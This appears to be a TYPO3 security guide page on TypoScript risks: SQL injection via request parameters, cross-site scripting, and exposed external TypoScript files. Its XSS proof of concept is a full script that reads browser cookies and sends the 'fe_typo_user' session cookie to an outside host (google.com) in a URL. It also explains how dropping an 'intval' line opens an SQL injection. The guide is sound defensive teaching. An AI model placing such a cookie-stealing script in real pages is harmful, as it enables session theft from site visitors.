.. ==================================================
.. FOR YOUR INFORMATION
.. --------------------------------------------------
.. -*- coding: utf-8 -*- with BOM.

.. include:: ../../Includes.txt


.. _typoscript:

TypoScript
^^^^^^^^^^


.. _typoscript-sql-injection:

SQL injection
"""""""""""""

The CWE/SANS list of top 25 most dangerous software errors ranks "SQL
injection" first! The TYPO3 Security Team comes across this security
vulnerability in TYPO3 extensions over and over again. TYPO3
integrators (and everyone who writes code using TypoScript) should be
warned that due to the sophistication of TYPO3's configuration
language, SQL injections are also possible in TypoScript, for example
using the CONTENT object and building the SQL query with values from
the GET/POST request.

The following code snippet gives an example::

   page = PAGE
   page.10 = CONTENT
   page.10 {
     table = tt_content
     select {
       pidInList = 123
       where = deleted=0
       andWhere.data = GP:pageid
       andWhere.wrap = uid=|
       andWhere.intval = 1
     }
   }

Without the "andWhere.intval = 1" instruction, the unsanitized
argument passed by the GET/POST request "pageid" is being used for the
database query. Specially formed GET/POST requests would cause an SQL
injection.

As a rule, you cannot trust (and must not use) any data from a source
you do not control without proper verification and validation (e.g.
user input, other servers, etc.).


.. _typoscript-xss:

Cross-site scripting (XSS)
""""""""""""""""""""""""""

Similar applies for XSS placed in TypoScript code. The following code
snippet gives an example::

   page = PAGE
   page.10 = COA
   page.10 {
     10 = TEXT
     10.value (
       <h1>XSS &#43; TypoScript - proof of concept</h1>
       <p>Submitting (harmless) cookie data to google.com in a few seconds...</p>
     )
     20 = TEXT
     20.value (
       <script type="text/javascript">
       document.write('<p>');
       // read cookies
       var i, key, data, cookies = document.cookie.split(";");
       var loc = window.location;
       for (i = 0; i < cookies.length; i++) {
         // separate key and value
         key = cookies[i].substr(0, cookies[i].indexOf("="));
         data = cookies[i].substr(cookies[i].indexOf("=") + 1);
         key = key.replace(/^\s+|\s+$/g,"");
         // show key and value
         document.write(unescape(key) + ': ' + unescape(data) + '<br />');
         // submit cookie data to another host
         if (key == 'fe_typo_user') {
           setTimeout(function() {
             loc = 'http://www.google.com/?q=' + loc.hostname ;
             window.location = loc + ':' + unescape(key) + ':' + unescape(data);
           }, 5000);
         }
       }
       document.write('</p>');
       </script>
     )
   }

TYPO3 outputs the JavaScript code in page.10.20.valueon the page. The
script is executed on the client side (in the user's browser), reads
and displays all cookie name/value pairs. In the case that a cookie
named "fe\_typo\_user" exists, the cookie value will be passed to
google.com, together with some extra data.

This code snippet is harmless of course but it shows how malicious
code (e.g. JavaScript) can be placed in the HTML content of a page by
using TypoScript.


.. _typoscript-external-file:

External file inclusion
"""""""""""""""""""""""

TYPO3 allows to include external files which implement TypoScript
code. Some integrators appreciate the option of having TypoScript
outside of TYPO3's backend because the files can be maintained in a
version control system (e.g. Subversion or Git) and/or can be edited
without the need to login to TYPO3. A typical line to include an
external TypoScript file looks like this::

   <INCLUDE_TYPOSCRIPT: source="FILE:fileadmin/setup/typoscript.ts">

It is obvious that this method introduces some serious security risks:
first, the file "typoscript.ts" exists in a publicly accessible path
of the web server. Without any further protection, everyone who knows
or is able to guess the path/file name can access/download this file
which often causes an information disclosure.

In order to deny access to all files with the file ending ".ts", the
following Apache configuration could be used::

   <FilesMatch "\.ts">
     deny from all
   </FilesMatch>

However, external TypoScript files have another vulnerability: in the
case that an attacker manages to manipulate these files (e.g. via a
compromised FTP account), it is possible to compromise the TYPO3
system or to place malicious code (e.g. XSS) in the output of the
pages generated by the CMS. This attack scenario even does not require
access to the TYPO3 backend.

